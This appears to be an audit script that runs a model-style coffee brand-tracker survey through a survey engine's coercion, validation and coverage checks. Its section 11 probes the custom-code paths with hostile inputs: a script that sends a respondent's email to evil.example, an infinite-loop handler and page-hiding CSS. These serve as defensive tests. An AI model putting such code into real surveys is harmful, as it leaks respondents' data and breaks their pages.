/*
 * AUDIT REPRO (AI / Intelligent Mode): a realistic brand-tracker generation
 * as a model would emit it — raw JSON through coerceSurveyActions, then
 * applySurveyActions on an empty survey, then coverageReport and the
 * runtime validator. Reports every refusal, warning and what validation
 * actually got attached.
 *
 * Run: node /tmp/audit/ai/brand-tracker.mjs
 */
import { SurveyDefinition } from "/home/claude/rescript/packages/schema/dist/index.js";
import { coerceSurveyActions, applySurveyActions, coverageReport, reviewSurvey, validateQuestion, createResponseState, runQualityCheck, diffSurveys } from "/home/claude/rescript/packages/engine/dist/index.js";

let n = 0;
const ids = (p) => `${p}_${++n}`;
const empty = () => SurveyDefinition.parse({ meta: { id: "s", code: "S", title: "Brand tracker" }, questions: [], flow: [{ type: "end", id: "e_ok", status: "complete" }], deployment: { clientSlug: "c", studySlug: "s" } });

/* what a model would plausibly write for "build a brand tracker for a coffee brand, 500 completes, 50/50 gender, 3 age bands" */
const RAW = [
  { op: "set_research", objective: "Track awareness, consideration and preference for Brand A against competitors among coffee drinkers", hypotheses: ["H1: Advertising recall increases brand consideration", "H2: Younger drinkers prefer Brand A more than older drinkers"], population: "Adults 18–65 who drink coffee at least weekly", sampleSize: 500,
    constructs: [{ name: "Ad recall", role: "independent", questions: ["AD_RECALL"] }, { name: "Consideration", role: "dependent", questions: ["CONSIDER"] }, { name: "Preference", role: "dependent", questions: ["PREF"] }],
    kpis: [{ name: "Unaided awareness", variable: "UNAIDED", measure: "share mentioning Brand A" }],
    brief: { client: "Brand A", businessQuestion: "Is the Q3 campaign lifting consideration?", decision: "Continue or re-plan Q4 media spend" } },
  { op: "create_block", ref: "SCR", title: "Screening" },
  { op: "create_question", ref: "AGE", block: "Screening", type: "numeric", text: "How old are you?", required: true, validation: [{ kind: "min_value", value: 18, message: "You must be 18 or over" }, { kind: "max_value", value: 99 }, { kind: "integer" }] },
  { op: "create_question", ref: "GENDER", block: "Screening", type: "single", text: "Which of these describes you?", options: ["Male", "Female", "Non-binary", { label: "Prefer not to say", exclusive: true }], required: true },
  { op: "create_question", ref: "FREQ", block: "Screening", type: "single", text: "How often do you drink coffee?", options: ["Daily", "A few times a week", "Once a week", "Less often", "Never"], required: true },
  { op: "add_skip", from: "FREQ", when: "FREQ in [4, 5]", to: "screen_out" },
  { op: "add_skip", from: "AGE", when: "AGE < 18 OR AGE > 65", to: "screen_out" },
  { op: "create_block", ref: "AWARE", title: "Awareness" },
  { op: "create_question", ref: "UNAIDED", block: "Awareness", type: "long_text", text: "Which coffee brands come to mind first? Please list as many as you can.", required: true, validation: [{ kind: "min_length", value: 2 }] },
  { op: "create_question", ref: "AIDED", block: "Awareness", type: "multi", text: "Which of these coffee brands have you heard of?", options: ["Brand A", "Brand B", "Brand C", "Brand D", { label: "None of these", exclusive: true }], randomize: true, required: true },
  { op: "create_question", ref: "AD_RECALL", block: "Awareness", type: "yes_no", text: "Have you seen or heard any advertising for Brand A in the last 3 months?", required: true },
  { op: "set_display_logic", target: "AD_RECALL", expression: "AIDED = \"Brand A\"" },
  { op: "create_block", ref: "FUNNEL", title: "Consideration and preference" },
  { op: "create_question", ref: "CONSIDER", block: "Consideration and preference", type: "matrix", text: "How likely are you to consider buying each of these brands next time?", rows: ["Brand A", "Brand B", "Brand C", "Brand D"], scale: { points: 5, low: "Very unlikely", high: "Very likely" }, required: true },
  { op: "set_display_logic", target: "CONSIDER", expression: "AIDED != 99" },
  { op: "create_question", ref: "PREF", block: "Consideration and preference", type: "single", text: "Which ONE brand do you prefer?", options: ["Brand A", "Brand B", "Brand C", "Brand D", { label: "Other (please specify)", other: true }], required: true },
  { op: "set_mask", target: "PREF", expression: "AIDED.Selected", action: "display" },
  { op: "create_question", ref: "NPS_A", block: "Consideration and preference", type: "nps", text: "How likely are you to recommend Brand A to a friend?", required: true },
  { op: "set_display_logic", target: "NPS_A", expression: "PREF = Brand A" },
  { op: "create_block", ref: "DEMO", title: "About you" },
  { op: "create_question", ref: "EMAIL", block: "About you", type: "email", text: "If you would like to join our panel, enter your email address", required: false, validation: [{ kind: "max_length", value: 120 }] },
  { op: "create_question", ref: "REGION", block: "About you", type: "dropdown", text: "Where do you live?", options: ["North", "South", "East", "West"], required: true },
  { op: "create_quota", name: "Gender × Age", total: 500, dimensions: [{ question: "GENDER", bands: [{ codes: ["Male"], share: 50 }, { codes: ["Female"], share: 50 }] }, { question: "AGE", bands: [{ label: "18–34", min: 18, max: 34 }, { label: "35–54", min: 35, max: 54 }, { label: "55–65", min: 55, max: 65 }] }], mode: "hard", onFull: "terminate" },
  { op: "set_question_analysis", target: "CONSIDER", role: "dependent", hypotheses: ["H1", "H2"], crosstabBy: ["AGE", "GENDER"] },
  { op: "set_question_analysis", target: "AD_RECALL", role: "independent", hypotheses: ["H1"] },
  { op: "set_question_analysis", target: "PREF", role: "dependent", hypotheses: ["H2"], crosstabBy: ["AGE"] },
  { op: "set_question_analysis", target: "AGE", role: "segmentation" },
  { op: "propose_analysis_plan" },
  { op: "add_analysis_test", method: "chi_square", outcome: "CONSIDER", variables: ["AD_RECALL"], hypotheses: ["H1"] },
];

const section = (t) => console.log(`\n=== ${t} ===`);

section("1. coerceSurveyActions");
const { actions, rejected } = coerceSurveyActions(RAW);
console.log(`raw ${RAW.length} → accepted ${actions.length}, rejected ${rejected.length}`);
for (const r of rejected) console.log(`  REJECTED #${r.index} (${RAW[r.index].op}): ${r.reason}`);

section("2. applySurveyActions on an empty survey");
const base = empty();
const out = applySurveyActions(base, actions, { ids, now: "2026-10-16T00:00:00Z" });
console.log(`valid=${out.valid} ok=${out.results.filter((r) => r.ok).length}/${out.results.length} errors=${out.errors.length} warnings=${out.warnings.length} destructive=${out.destructive.length}`);
for (const r of out.results) console.log(`  ${r.ok ? "ok " : "ERR"} #${r.index} ${r.op}: ${r.ok ? r.description : r.error}${r.suggestion ? `  → suggestion: ${JSON.stringify(r.suggestion)}` : ""}${r.issues?.filter((i) => i.level === "warning").length ? `  [warn: ${r.issues.filter((i) => i.level === "warning").map((i) => i.message).join(" | ")}]` : ""}`);
console.log("errors:"); for (const e of out.errors) console.log(`  - ${e}`);
console.log("warnings:"); for (const w of out.warnings) console.log(`  - ${w}`);
console.log("destructive:"); for (const d of out.destructive) console.log(`  - ${d}`);

const def = out.def;
const byVar = (v) => def.questions.find((q) => q.variableName === v);

section("3. validation attached");
for (const v of ["AGE", "EMAIL", "UNAIDED", "CONSIDER"]) {
  const q = byVar(v);
  if (!q) { console.log(`  ${v}: NOT CREATED`); continue; }
  console.log(`  ${v} (${q.code}, ${q.type}/${q.variant}) required=${q.required} validation=${JSON.stringify(q.validation)}`);
}

section("4. runtime validation of bad answers");
const run = (v, value) => {
  const q = byVar(v); if (!q) return;
  const state = createResponseState(def);
  const errs = validateQuestion(def, q, value, { def, state });
  console.log(`  ${v} = ${JSON.stringify(value)} → ${errs.length ? errs.map((e) => `${e.severity ?? "error"}: ${e.message}`).join(" | ") : "ACCEPTED (no error)"}`);
};
run("AGE", 17); run("AGE", 25.5); run("AGE", "abc"); run("AGE", 130);
run("EMAIL", "not-an-email"); run("EMAIL", "a@b.co");

section("5. where the brief / hypotheses / plan live");
console.log("  research.brief:", JSON.stringify(def.research?.brief));
console.log("  research.hypotheses:", JSON.stringify(def.research?.hypotheses));
console.log("  research.hypothesisDetails:", JSON.stringify(def.research?.hypothesisDetails));
console.log("  research.constructs:", JSON.stringify(def.research?.constructs?.map((c) => ({ name: c.name, questionIds: c.questionIds }))));
console.log("  research.kpis:", JSON.stringify(def.research?.kpis));
console.log("  question.analysis tags:", JSON.stringify(def.questions.filter((q) => q.analysis).map((q) => [q.variableName, q.analysis.role, q.analysis.hypotheses])));
const plan = def.research?.analysisPlan;
console.log(`  analysisPlan: source=${plan?.source} crosstabs=${plan?.crosstabs?.length} tests=${plan?.tests?.length} derived=${plan?.derived?.length}`);
for (const t of plan?.tests ?? []) console.log(`    test ${t.id}: ${t.method} outcome=${t.outcome} vars=${t.variables?.join(",")} groupBy=${t.groupBy ?? ""} H=${t.hypotheses?.join(",")}`);
for (const x of plan?.crosstabs ?? []) console.log(`    xtab ${x.id}: ${x.rows.join("+")} by ${x.columns.join("+")} H=${x.hypotheses?.join(",")}`);

section("6. coverageReport (the generation gate)");
const cov = coverageReport(def);
console.log(`  ok=${cov.ok} summary=${cov.summary}`);
console.log(`  unmeasured=${JSON.stringify(cov.unmeasured)} unconnected=${JSON.stringify(cov.unconnected.map((q) => q.code))}`);

section("7. reviewSurvey + quality check on the result");
const rev = reviewSurvey(def);
for (const f of rev.findings.slice(0, 30)) console.log(`  ${f.severity}: ${f.message}`);
const qc = runQualityCheck(def).areas.flatMap((a) => a.issues).filter((i) => i.level === "error");
console.log(`  quality errors: ${qc.length}`); for (const i of qc) console.log(`    - ${i.questionCode ?? ""} ${i.message}`);

section("8. quotas / flow");
console.log("  quotas:", JSON.stringify(def.quotas?.map((q) => ({ name: q.name, cells: q.cells.map((c) => [c.label, c.limit]) }))));
console.log("  flow top-level:", JSON.stringify(def.flow.map((n) => `${n.type}${n.title ? `:${n.title}` : ""}`)));
console.log("  display logic:", JSON.stringify(def.questions.filter((q) => q.displayLogic).map((q) => [q.variableName, JSON.stringify(q.displayLogic).slice(0, 160)])));

section("9. follow-up edit: set_research replaces hypotheses in a new order — do H-tags follow?");
const edit = applySurveyActions(def, coerceSurveyActions([{ op: "set_research", hypotheses: ["H2: Younger drinkers prefer Brand A more than older drinkers", "H1: Advertising recall increases brand consideration", "H3: Heavy drinkers are more loyal"] }]).actions, { ids });
console.log(`  valid=${edit.valid} errors=${JSON.stringify(edit.errors)} warnings=${JSON.stringify(edit.warnings)}`);
console.log("  hypotheses now:", JSON.stringify(edit.def.research.hypotheses.map((h) => h.slice(0, 30))));
console.log("  AD_RECALL tags now:", JSON.stringify(edit.def.questions.find((q) => q.variableName === "AD_RECALL")?.analysis?.hypotheses), "(was H1 = ad recall → consideration; H1 is now the age hypothesis)");
console.log("  plan test tags now:", JSON.stringify(edit.def.research.analysisPlan?.tests.map((t) => [t.method, t.outcome, t.hypotheses])));
console.log("  coverage after:", coverageReport(edit.def).summary);

section("10. follow-up edit: set_validation on EMAIL to add a required rule — is the email rule kept?");
const e2 = applySurveyActions(def, coerceSurveyActions([{ op: "set_validation", target: "EMAIL", rules: [{ kind: "required" }] }]).actions, { ids });
console.log(`  result: ${e2.results[0].description} destructive=${JSON.stringify(e2.destructive)} validation=${JSON.stringify(e2.def.questions.find((q) => q.variableName === "EMAIL")?.validation)}`);

section("11. free-form code paths: create_behavior script and set_custom_code js");
const code = applySurveyActions(def, coerceSurveyActions([
  { op: "create_behavior", label: "fetch", target: "NPS_A", script: "fetch('https://evil.example/x?'+rs.getAnswer('EMAIL'))" },
  { op: "create_behavior", label: "ok", target: "NPS_A", script: "rs.listen('answer', 'self', () => rs.showMessage('self', 'Thanks'));" },
  { op: "set_custom_code", target: "PREF", js: "document.querySelector('[data-testid=rs-next]').addEventListener('click', () => { while(true){} })" },
  { op: "set_custom_code", target: "PREF", css: "& { color: red } body { display:none }" },
]).actions, { ids });
for (const r of code.results) console.log(`  ${r.ok ? "ok " : "ERR"} ${r.op}: ${r.ok ? r.description : r.error}`);

section("12. a partial reply: 25 actions with the matrix's rows missing and a dangling reference");
const partial = applySurveyActions(empty(), coerceSurveyActions([
  { op: "create_block", title: "B" },
  { op: "create_question", ref: "A", type: "single", text: "A?", options: ["x", "y"] },
  { op: "create_question", ref: "M", type: "matrix", text: "Rate", scale: { points: 5 } },
  { op: "set_display_logic", target: "M", expression: "A = 1" },
  { op: "add_skip", from: "A", when: "A = 2", to: "NOT_THERE" },
  { op: "set_question_analysis", target: "M", role: "dependent", hypotheses: ["H9"] },
]).actions, { ids });
console.log(`  valid=${partial.valid} ok=${partial.results.filter((r) => r.ok).length}/${partial.results.length}`);
for (const r of partial.results) console.log(`  ${r.ok ? "ok " : "ERR"} ${r.op}: ${r.ok ? r.description : r.error}`);
console.log("  warnings:", JSON.stringify(partial.warnings));
